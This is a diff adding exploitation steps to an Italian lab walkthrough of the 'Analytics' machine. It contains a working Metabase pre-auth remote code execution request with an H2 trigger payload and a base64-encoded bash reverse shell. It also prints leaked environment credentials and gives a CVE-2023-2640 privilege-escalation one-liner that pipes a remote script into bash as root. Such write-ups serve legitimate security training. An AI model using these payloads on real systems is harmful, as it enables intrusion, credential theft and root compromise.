@@ -65,23 +65,137 @@ Facendo una rapida ricerca su internet mi imbatto in questa vulnerabilità: [Pre
 
 ## Exploitation
 
-Sfruttandola riesco ad ottenere una reverse shel per l'utente _metabase_:
+Per sfruttare questa vulnerabilità occorre recuperare il setup-token. E' possibile ottenerlo al seguente indirizzo:_http://data.analytical.htb/api/session/properties_.
 
-**img reverse shell**
+<p align="center">
+  <img src="/Immagini/Linux-Box/Analytics/analytics-3.png" />
+</p>
 
-Da qui riesco ad ottenere le credenziali per l'accesso tramite ssh relative all'utente metalytics:
+Successivamente, utilizzo _burpsuite_ per inviare una richiesta e creare una reverse-shell. Prima però avvio un listener sulla porta 4444 e codifico, in base 64, il seguente comando:
+
+```text
+bash -i >&/dev/tcp/10.10.14.5/4444 0>&1
+```
+
+```text
+YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjUvNDQ0NCAwPiYx
+```
+
+Quindi, invio questa richiesta tramite _burpsuite_:
+
+```text
+POST /api/setup/validate HTTP/1.1
+Host: data.analytical.htb
+Content-Type: application/json
+Content-Length: 812
+
+{
+    "token": "5491c003-41c2-482d-bab4-6e174aa1738c",
+    "details":
+    {
+        "is_on_demand": false,
+        "is_full_sync": false,
+        "is_sample": false,
+        "cache_ttl": null,
+        "refingerprint": false,
+        "auto_run_queries": true,
+        "schedules":
+        {},
+        "details":
+        {
+            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjUvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}')\n$$--=x",
+            "advanced-options": false,
+            "ssl": true
+        },
+        "name": "an-sec-research-team",
+        "engine": "h2"
+    }
+}
+```
+
+Ottengo la seguente reverse-shell:
+
+<p align="center">
+  <img src="/Immagini/Linux-Box/Analytics/analytics-4.png" />
+</p>
+
+Visualizzando il contenuto delle variabili di ambiente, scopro username e password dell'utente _metalytics_:
+
+```text
+SHELL=/bin/sh
+MB_DB_PASS=
+HOSTNAME=7a9ce06949c1
+LANGUAGE=en_US:en
+MB_JETTY_HOST=0.0.0.0
+JAVA_HOME=/opt/java/openjdk
+MB_DB_FILE=//metabase.db/metabase.db
+PWD=/
+LOGNAME=metabase
+MB_EMAIL_SMTP_USERNAME=
+HOME=/home/metabase
+LANG=en_US.UTF-8
+META_USER=metalytics
+META_PASS=An4lytics_ds20223#
+MB_EMAIL_SMTP_PASSWORD=
+USER=metabase
+SHLVL=4
+MB_DB_USER=
+FC_LANG=en-US
+LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
+LC_CTYPE=en_US.UTF-8
+MB_LDAP_BIND_DN=
+LC_ALL=en_US.UTF-8
+MB_LDAP_PASSWORD=
+PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+MB_DB_CONNECTION_URI=
+JAVA_VERSION=jdk-11.0.19+7
+_=/usr/bin/env
+```
 
 ```text
 metalytics:An4lytics_ds20223#
 ```
 
-**Una volta dentro ottengo il primo flag!**
+Provo quindi a sfruttarle per eseguire un accesso tramite ssh:
 
-**img flag user**
+<p align="center">
+  <img src="/Immagini/Linux-Box/Analytics/analytics-5.png" />
+</p>
 
+**Ottengo così il primo flag!**
 
 ## Privilege Escalation
 
-Sfrutto la seguente vulnerabilità per diventare root: [CVE-2023-2640](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/)
+Lanciando lo script _linpeas.sh_ scopro la seguente informazione:
 
-**img flag root**
+```text
+OS: Linux version 6.2.0-25-generic (buildd@lcy02-amd64-044) (x86_64-linux-gnu-gcc-11 (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #25~22.04.2-Ubuntu
+```
+
+Facendo una ricerca capisco che questa versione di Ubuntu è vulnerabile alla seguente vulnerabilità: [CVE-2023-2640](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/).
+
+Per poter sfruttare questa vulnerabilità, ed elevare quindi i miei privilegi, utilizzo quindi il seguente script e avvio un listener sulla porta 8000:
+
+```text
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("curl 10.10.14.5:8000/rev|bash")'
+```
+
+**Cosi facendo ottengo una reverse-shell con privilegi root!**
+
+Purtroppo però non ho i permessi per accedere alla cartella root:
+
+<p align="center">
+  <img src="/Immagini/Linux-Box/Analytics/analytics-5.png" />
+</p>
+
+Il possessore della cartella root è l'utente _nobody_:
+
+```text
+drwx------   6 nobody nogroup  4096 Aug 25 15:14 root
+```
+
+Il quale ha il seguente UID:
+
+```text
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+```
